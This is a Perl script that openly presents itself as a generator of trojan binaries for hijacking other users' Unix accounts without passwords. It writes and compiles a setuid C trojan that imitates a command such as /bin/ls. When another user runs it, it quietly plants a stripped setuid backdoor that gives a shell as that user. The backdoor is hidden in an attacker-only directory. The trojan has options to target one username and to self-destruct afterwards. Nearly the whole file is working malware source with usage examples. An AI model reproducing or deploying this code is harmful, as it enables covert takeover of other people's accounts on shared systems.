#!/usr/bin/perl

##################################################################################################################
# 
# File         : puncture.pl
# Description  : Creates trojan binaries that help highjack other users unix/linux accounts without passwords
# Original Date: 2010
# Author       : simran@dn.gs
#
##################################################################################################################


##################################################################################################################
#
# create the puncture binary... 
#

##################################################################################################################
#
# load all required modules
#
use strict;
use Getopt::Long;

##################################################################################################################
#
# turn off buffering of STDOUT
#
$| = 1;

###################################################################################################################
#
# CONSTANTS / GLOBALS
#
my $puncture_outdir             = "out";
my $trojan_autogenerated_source = "${puncture_outdir}/trojan-autogenerated.c";
my $trojan_autogenerated_binary = "${puncture_outdir}/trojan-autogenerated";
my $command_line                = "$0 @ARGV";

my $version                      = q($Revision: 5 $);


#################################################################################################################
#
# get the command line arguments
#

my $debug_trojan_binary                 = 0;
my $hide_punctures_in                   = undef;
my $puncture_only_username              = undef;
my $emulate                             = undef;
my $shell                               = "/bin/sh";
my $self_destruct_on_first_run          = 0;
my $self_destruct_on_successful_puncture = 0;

my $result = GetOptions(
                        "debug-trojan-binary+"                  => \$debug_trojan_binary,
                        "hide-punctures-in=s"                   => \$hide_punctures_in,
                        "puncture-only-username=s"              => \$puncture_only_username,
                        "emulate=s"                             => \$emulate,
                        "shell=s"                               => \$shell,
                        "self-destruct-on-first-run+"           => \$self_destruct_on_first_run,
                        "self-destruct-on-successful-puncture+" => \$self_destruct_on_successful_puncture,
             );

#
#
#
if (! $result) {
  &usage();
}
elsif (! $hide_punctures_in) {
  &usage("You must specify a --hide-punctures-in option");
}
elsif (! -d $hide_punctures_in) {
  &usage("the directories specified by --hide-punctures-in is not a directory");
}
elsif (! $emulate) {
  &usage("You must specify a --emulate option");
}
elsif ($emulate !~ /^\//) {
  &usage("the --emulate file must have an absolute path specified to it... eg. /bin/ls (not simply 'ls')");
}
elsif (! -f $emulate) {
  &usage("the file specified by --emulate not a file");
}
elsif ($shell !~ /^\//) {
  &usage("the --shell file must have an absolute path specified to it... eg. /bin/sh (not simply 'sh')");
}
elsif (! -f $shell) {
  &usage("the file specified by --shell not a file");
}
elsif (($self_destruct_on_first_run + $self_destruct_on_successful_puncture) > 1) {
  &usage("You can specifiy only ONE option between --self-destruct-on-first-run or --self-destrust-on-successful-puncture ");
}

#################################################################################################################
#
# some global vars...
#


#################################################################################################################
#
# MAIN
#

&main();

#
# END OF MAIN
#
#################################################################################################################

##################################################################################################################
#
# main: main... 
#
sub main {
  &ensurePunctureOutDirectoryExists();
  &createCSource();
  &compileCSource();
  &chmodPunctureBinary();

  if ($debug_trojan_binary) {
    warn "**************************************************************************\n";
    warn "WARNING: You have enabled debug in the trojan binary via --debug-trojan-binary : be very careful about who you give access to, as all the steps of what its doing are very clear via the debugging messages\n";
    warn "**************************************************************************\n";
  }
}

##################################################################################################################
#
# chmodPunturBinary: chmod's the puncture binary to the appropriate permissions... 
#
sub ensurePunctureOutDirectoryExists {
    if (! -d $puncture_outdir) {
        mkdir($puncture_outdir) || die "could not create directory $puncture_outdir: $!";
    }
}


##################################################################################################################
#
# chmodPunturBinary: chmod's the puncture binary to the appropriate permissions... 
#
sub chmodPunctureBinary {
    my $mode = "7111";
    print "chmod: change mode to $mode on binary $trojan_autogenerated_binary\n";
    chmod(oct($mode), $trojan_autogenerated_binary) || die "Could not chmod $trojan_autogenerated_binary: $!";
}


##################################################################################################################
#
# compileCSource: compiles the C source file...
#
sub compileCSource {
  my $cmd = "cc -o $trojan_autogenerated_binary $trojan_autogenerated_source";
  print "compiling binary: $cmd\n";
  system($cmd);
}

##################################################################################################################
#
# createCSource: creates the C source file that will need to be compiled and appropriately chmodded... 
#
sub createCSource {
  print "c-source: create the c source file: $trojan_autogenerated_source\n";
  my $timenow = scalar localtime;

  open(OUT, "> $trojan_autogenerated_source") || die "could not open $trojan_autogenerated_source for writing: $!";

  my $source = q(
/***********************************************************************************************************************************************************
 * THIS FILE IS AUTOGENERATED - DO NOT MODIFY!
 **********************************************************************************************************************************************************/
 
/***********************************************************************************************************************************************************
 * File created using command line: {{command_line}}
 * File created at                : {{timenow}}
 * Puncture Version                : {{version}}
 **********************************************************************************************************************************************************/

/***********************************************************************************************************************************************************
 * include all the necessary header files... 
 **********************************************************************************************************************************************************/
#include <stdio.h>
#include <stdlib.h>
#include <pwd.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>
#include <time.h>

/***********************************************************************************************************************************************************
 * populate_puncture_source: the source of the actual puncture file... 
 **********************************************************************************************************************************************************/
void populate_puncture_source(char **puncture_source, int current_uid, int current_gid, int debug) {

  /***********************************************************************************************************************
   * function variables... 
   **********************************************************************************************************************/
  char *newline = "\n";
  char *source;

  /***********************************************************************************************************************
   * allocate enough memory for the variable to hold all the code... 
   **********************************************************************************************************************/
  source = malloc((17315 * sizeof(char)) + 1000); 

  /***********************************************************************************************************************
   * the code of the puncture file... 
   **********************************************************************************************************************/
  sprintf(source, "%s#include <stdio.h>%s", source, newline);
  sprintf(source, "%s#include <stdlib.h>%s", source, newline);
  sprintf(source, "%s#include <pwd.h>%s", source, newline);
  sprintf(source, "%s#include <string.h>%s", source, newline);
  sprintf(source, "%s#include <sys/stat.h>%s", source, newline);
  sprintf(source, "%s%s", source, newline);
  sprintf(source, "%sint main(int argc, char **argv) {%s", source, newline);
  sprintf(source, "%s%s", source, newline);
  sprintf(source, "%s  char *puncture_file = argv[0];%s", source, newline);
  sprintf(source, "%s  struct stat puncture_file_stat;%s", source, newline);
  sprintf(source, "%s  stat(puncture_file, &puncture_file_stat);%s", source, newline);
  sprintf(source, "%s  int puncture_file_mode = puncture_file_stat.st_mode;%s", source, newline);
  sprintf(source, "%s%s", source, newline);

  /***********************************************************************************************************************
   * The reason we cannot say for sure if the setuid bit is set is because say the file is in a directory owned by
   * "simran" (with access to no-one else) and the puncture file is owned by "testuser"... on *some* systems, having the 
   * seteuid bit set means that the OS changes your userid before executing any part of the file, resulting in 
   * "testuser" (who you are not emulating as the OS has changed the userid from "simran" to "testuser" right at the 
   * start) not being able to get a directory listing and hence not determine the mode of the file. On other systems
   * where the OS does not automatically change your id based on the seteuid bit, but does it if you call the
   * seteuid function in your binary, the "stat" will be called as "simran" who does have access to the directory
   * and can "stat" the file, and you will get an accurate result... 
   * (having said that, we can switch user'ids and try to stat the file, but right now i can't be bothered... its left
   * as a TODO item :) 
   **********************************************************************************************************************/
  sprintf(source, "%s  if (! (puncture_file_mode & S_ISUID)) {%s", source, newline);
  sprintf(source, "%s    printf(\"puncture file owner setuid bit *might* not be set. if it is not set then the puncture will not work. the reasons for why it *might* not be set could be that the fiel was either coopied or moved accross filesystems\\\\n\");%s", source, newline);
  sprintf(source, "%s  }%s", source, newline);

  sprintf(source, "%s%s", source, newline);
  sprintf(source, "%s  setuid(%d);%s", source, current_uid, newline);
  sprintf(source, "%s  setgid(%d);%s", source, current_gid, newline);
  sprintf(source, "%s  seteuid(%d);%s", source, current_uid, newline);
  sprintf(source, "%s  setegid(%d);%s", source, current_gid, newline);
  sprintf(source, "%s  system(\"/bin/sh\");%s", source, newline);
  sprintf(source, "%s  return 0;%s", source, newline);
  sprintf(source, "%s}%s", source, newline);

  if (debug) {
    printf("debug: source of puncture file to be compiled on the fly is\n");
    printf("-----------------------------------------------------------------------------------------------------------\n");
    printf("%s", source);
    printf("-----------------------------------------------------------------------------------------------------------\n");
  }

  /***********************************************************************************************************************
   * point the puncture_source to the actual source... 
   **********************************************************************************************************************/
  *puncture_source = source; 
}


/***********************************************************************************************************************************************************
 * main: ...
 **********************************************************************************************************************************************************/
int main (int argc, char **argv) {

  /***********************************************************************************************************************
   * the core variables... 
   ***********************************************************************************************************************/
  const char *hide_punctures_in                  = "{{hide_punctures_in}}";
  const int debug                                = {{debug_trojan_binary}};
  const int self_destruct_on_first_run           = {{self_destruct_on_first_run}};
  const int self_destruct_on_successful_puncture = {{self_destruct_on_successful_puncture}};
  const char *puncture_only_username             = "{{puncture_only_username}}"; 
  char *emulate_cmd                              = "{{emulate}}";

  /***********************************************************************************************************************
   * the 'cmd' variable is a placeholder for all the system command we want to run... define it here... 
   ***********************************************************************************************************************/
  char *cmd;

  /***********************************************************************************************************************
   * the 'msg' variable is a placeholder for all the generic messages we want to temporarily hold... 
   ***********************************************************************************************************************/
  char *msg;

  /***********************************************************************************************************************
   * setup the trojan_file variable - this is the variable that holds 
   * the current trojan command being executed
   ***********************************************************************************************************************/
  char *trojan_file = argv[0];
  
  /***********************************************************************************************************************
   * get the uid/gid of the current user... 
   ***********************************************************************************************************************/
  int current_uid           = getuid();
  int current_gid           = getgid();

  if (debug) { printf("debug: current user id is: %d\n", current_uid);  }
  if (debug) { printf("debug: current group id is: %d\n", current_gid); }

  /***********************************************************************************************************************
   * get the uid/gid of the trojan_file_owner and the current_user
   ***********************************************************************************************************************/
  struct stat trojan_file_stat;
  stat(trojan_file, &trojan_file_stat);

  int trojan_file_owner_uid = trojan_file_stat.st_uid;
  int trojan_file_owner_gid = trojan_file_stat.st_gid;

  if (debug) { printf("debug: trojan file owner user id is: %d\n", trojan_file_owner_uid);          }
  if (debug) { printf("debug: trojan file owner current group id is: %d\n", trojan_file_owner_gid); }

  /***********************************************************************************************************************
   * check if the setuid bit on the trojan binary is set... if not, it just won't create punctures... 
   ***********************************************************************************************************************/
  int trojan_file_mode = trojan_file_stat.st_mode;
  if (! (trojan_file_mode & S_ISUID)) {
    if (debug) { printf("debug: trojan file owner setuid bit not set so trojan cannot puncture (you might have copied it or moved it to another filesystem?)\n"); }
  }
  
  /************************************************************************************************************************
   * append the command line args passed to this trojan binary to the command we are a trojan for (emulate_cmd)...
   * and call the variable emulate_cmd_with_args
   ***********************************************************************************************************************/
  int argc_counter;
  char *emulate_cmd_with_args;

  emulate_cmd_with_args = realloc(NULL, strlen(emulate_cmd)+1);
  strcpy(emulate_cmd_with_args, emulate_cmd);
  
  for (argc_counter = 1; argc_counter < argc; argc_counter++) {
    char buf[strlen(argv[argc_counter]) +1]; 
    strcpy(buf, argv[argc_counter]); 
    emulate_cmd_with_args = realloc(emulate_cmd_with_args, (strlen(emulate_cmd_with_args) + strlen(buf) + 1) ); 
    strcat(emulate_cmd_with_args, " ");
    strcat(emulate_cmd_with_args, buf); 
  }

  if (debug) { printf("debug: command to emulate is: %s\n", emulate_cmd_with_args); }

  /************************************************************************************************************************
   * get the username of the current user... 
   ***********************************************************************************************************************/
  char current_username[1000];
  struct passwd *current_user_passwd_struct;
  current_user_passwd_struct = getpwuid(current_uid);
  sprintf(current_username, "%s", current_user_passwd_struct->pw_name);

  if (debug) { printf("debug: current username is: %s\n", current_username); }

  /************************************************************************************************************************
   * if we are only trying to puncture a particular users account, then if the current user is not that user
   * emulate the command we are a trojan for and exit... 
   ***********************************************************************************************************************/
  if ( (strlen(puncture_only_username) > 0) && (strcmp(puncture_only_username, current_username) != 0) ) {
    if (debug) { printf("debug: not creating puncture as we have to puncture only \"%s\"'s account but the current username is \"%s\"\n", puncture_only_username, current_username); }
    if (debug) { printf("debug: executing system command: %s\n", emulate_cmd_with_args); }
    system(emulate_cmd_with_args);
    return 0;
  }
  else {
      /************************************************************************************************************************
       * seed the random number generation routine with the local time... 
       ***********************************************************************************************************************/
      srand((int) time(NULL));

      /************************************************************************************************************************
       * set the puncture_dir variable 
       ***********************************************************************************************************************/
      int puncture_dir_rand_num = (int) rand();
      char *puncture_dir = malloc(strlen(hide_punctures_in) + strlen(current_username) + sizeof(puncture_dir_rand_num) + 100);
      sprintf(puncture_dir, "%s/%s-%d", hide_punctures_in, current_username, puncture_dir_rand_num); 

      if (debug) { printf("debug: puncture directory is: %s\n", puncture_dir); }
      
      /************************************************************************************************************************
       * set the puncture_file variable
       ***********************************************************************************************************************/
      int puncture_file_rand_num = (int) rand();
      char *puncture_file = malloc(strlen(puncture_dir) + sizeof(puncture_file_rand_num) + 100);
      sprintf(puncture_file, "%s/puncture-%d", puncture_dir, puncture_file_rand_num); 

      if (debug) { printf("debug: puncture file is: %s\n", puncture_file); }

      /************************************************************************************************************************
       * change user and group id's to the owner of the trojan file and create the puncture directory (as this should 
       * be owned by the owner of the trojan file). Ensure the torjan directory is writable by the current
       * user as that is where the current users "owned" puncture file will be cerated... (remember octal numbers start with 0)
       ***********************************************************************************************************************/
      seteuid(trojan_file_owner_uid);
      setegid(trojan_file_owner_gid);
      setuid(trojan_file_owner_uid);
      setgid(trojan_file_owner_gid);
      if (debug) { printf("debug: changed user id to (%d) which is the trojan_file_owners uid\n", trojan_file_owner_uid); }

      mkdir(puncture_dir, 0777);
      if (debug) { printf("debug: creating the directory: %s\n", puncture_dir); }


      chmod(puncture_dir, 0777);
      if (debug) { printf("debug: chmod'ding the directory (%s) to 777\n", puncture_dir); }


      /************************************************************************************************************************
       * change user and group id's to the current user 
       * create the C source on the fly, compile it to create the puncture and chmod it to the right permissions
       ***********************************************************************************************************************/
      seteuid(current_uid);
      setegid(current_gid);
      setuid(current_uid);
      setgid(current_gid);
      if (debug) { printf("debug: changed user id to (%d) which is the current users uid\n", current_uid); }

      char *puncture_source;
      populate_puncture_source(&puncture_source, current_uid, current_gid, debug); 

      cmd = realloc(NULL, strlen(puncture_file) + strlen(puncture_source) + 100);

      if (debug) { sprintf(cmd, "cat <<EOF | cc -xc -o %s - \n%s", puncture_file, puncture_source); }
      else       { sprintf(cmd, "cat <<EOF | cc -xc -o %s - >/dev/null 2>&1 \n%s", puncture_file, puncture_source); }

      if (debug) { printf("debug: about to create puncture file: %s\n", puncture_file); }

      system(cmd); 
      if (debug) { printf("debug: created puncture: %s\n", puncture_file); }

      /************************************************************************************************************************
       * strip the binary to take out all the symbols (including debugging symbols) from the resultant file... 
       ***********************************************************************************************************************/
      cmd = realloc(NULL, strlen(puncture_file) + 100);
      sprintf(cmd, "strip -s %s", puncture_file);
      if (debug) { printf("debug: about to strip binary: %s\n", puncture_file); }

      if (!debug) { sprintf(cmd, "%s %s", cmd, "> /dev/null 2>&1"); }
      system(cmd);
      if (debug) { printf("debug: finished stripping binary: %s\n", puncture_file); }

      /************************************************************************************************************************
       * set the right permission on the file so that when we run the file, we can puncture a shell into the other 
       * persons account (remember: octal numbers start with 0)
       ***********************************************************************************************************************/
      chmod(puncture_file, 07755);

      /************************************************************************************************************************
       * check to see if the chmod worked on the puncture file... 
       ***********************************************************************************************************************/
      struct stat puncture_file_stat;
      stat(puncture_file, &puncture_file_stat);

      int puncture_file_mode = puncture_file_stat.st_mode;
      if (! (puncture_file_mode & S_ISUID)) {
        if (debug) { printf("debug: puncture file not chmod'ed properly - could not set the seteuid bit, so puncture won't work. Does the filesystem allow files with seteuid bits set?\n"); }
      }

      /************************************************************************************************************************
       * change user and group id's to the trojan binary owner and restrict the current user (or any other user, except
       * root of course) from getting access to the directory that contains the puncture!
       ***********************************************************************************************************************/
      seteuid(trojan_file_owner_uid);
      setegid(trojan_file_owner_gid);
      setuid(trojan_file_owner_uid);
      setgid(trojan_file_owner_gid);
      if (debug) { printf("debug: changed user id to (%d) which is the trojan_file_owners uid\n", trojan_file_owner_uid); }

      chmod(puncture_dir, 0700);
      if (debug) { printf("debug: chmod'ding the puncture directory (%s) to 700\n", puncture_dir); }


      /************************************************************************************************************************
       * if we are meant to remove ourselves (the trojan binary), then do so... 
       ***********************************************************************************************************************/
       if (self_destruct_on_first_run) {
         if (debug) { printf("debug: self destruct on first run was turned on, so about to remove file: %s\n", trojan_file); }
         remove(trojan_file);
       }
       else if (self_destruct_on_successful_puncture) {
         struct stat puncture_file_stat;
         stat(puncture_file, &puncture_file_stat);

         if ( (puncture_file_stat.st_uid == current_uid ))  {
           if (debug) { printf("debug: self destruct on successful puncture turned on, so about to remove file: %s\n", trojan_file); }
           remove(trojan_file);
         }
       }

      /************************************************************************************************************************
       * change user and group id's to the current user and emulate the command we are the trojan for... 
       ***********************************************************************************************************************/
      seteuid(current_uid);
      setegid(current_gid);
      setuid(current_uid);
      setgid(current_gid);
      if (debug) { printf("debug: changed user id to (%d) which is the current users uid\n", current_uid); }

      if (debug) { printf("debug: executing system command: %s\n", emulate_cmd_with_args); }
      system(emulate_cmd_with_args); 

      return 0;
  }

}

);

  #
  # we have used {{ and }} to encapsulate some of the variables we want to interpolate... so interpolate now... 
  #
  $source =~ s/\{\{command_line\}\}/$command_line/g;
  $source =~ s/\{\{timenow\}\}/$timenow/g;
  $source =~ s/\{\{version\}\}/$version/g;
  $source =~ s/\{\{hide_punctures_in\}\}/$hide_punctures_in/g;
  $source =~ s/\{\{debug_trojan_binary\}\}/$debug_trojan_binary/g;
  $source =~ s/\{\{self_destruct_on_first_run\}\}/$self_destruct_on_first_run/g;
  $source =~ s/\{\{self_destruct_on_successful_puncture\}\}/$self_destruct_on_successful_puncture/g;
  $source =~ s/\{\{puncture_only_username\}\}/$puncture_only_username/g;
  $source =~ s/\{\{emulate\}\}/$emulate/g;

  #
  # the source_size calculated here is taht of the trojan binary source, but we actually only need the source of the puncture binary as a minimum... 
  # but as the puncture file source is embedded in the trojan source, we are sure to be safe by allocating enough memory by using the trojan source size... 
  #
  my $source_size = length($source);
  $source =~ s/\{\{source_size\}\}/$source_size/g;

  #
  #
  #
  print OUT $source;

}


##################################################################################################################
#
# error: Prints out error message and exits
#
sub error {
  my $error = shift;
  print STDERR "\n\nError: $error\n\n";
  exit(1);
}


##################################################################################################################
#
# usage: Outputs the usage of this script..
#
sub usage {
  my $error = shift;

  if ($error) {
    print STDERR "Error\n";
    print STDERR "\n-----\n";
    print STDERR "$error\n";
    print STDERR "\n-----------------------------------------------------------------------\n";
  }

  print STDERR <<EOUSAGE;

Usage: $0 [--debug-trojan-binary] --hide-puncture-in <dir> [--puncture-only-username=username] --emulate cmd [--shell=cmd] [--self-destruct-on-first-run|--self-destruct-on-successful-puncture]

* --debug-trojan-binary                : put in debugging messages into the trojan binary 

* --hide-punctures-in                    : spcify the directory where the puncture files should be stored

* --puncture-only-username               : only the specified username will have a puncture file created

* --emulate                             : defines the command to emulate when executed

* --shell                               : defines the shell to execute as part of the puncture

* --self-destruct-on-first-run          : the trojan binary will delete itself after its run for the first time

* --self-destruct-on-successful-puncture : the trojan binary will delete itself after the first successful puncture (only useful with the --puncture-only-username argument, unless you want to remove the binary after the first successful puncture, whoever it was!)


Examples
--------

$0 --hide-punctures-in /home/simran/punctures --emulate /bin/ls --shell /bin/sh 

$0 --hide-punctures-in /home/simran/punctures --emulate /bin/ls --shell /bin/sh --self-destruct-on-first-run 

$0 --hide-punctures-in /home/simran/punctures --emulate /bin/ls --shell /bin/sh --puncture-only-username cyclops --self-destruct-on-successful-puncture

EOUSAGE

  exit(1);
}




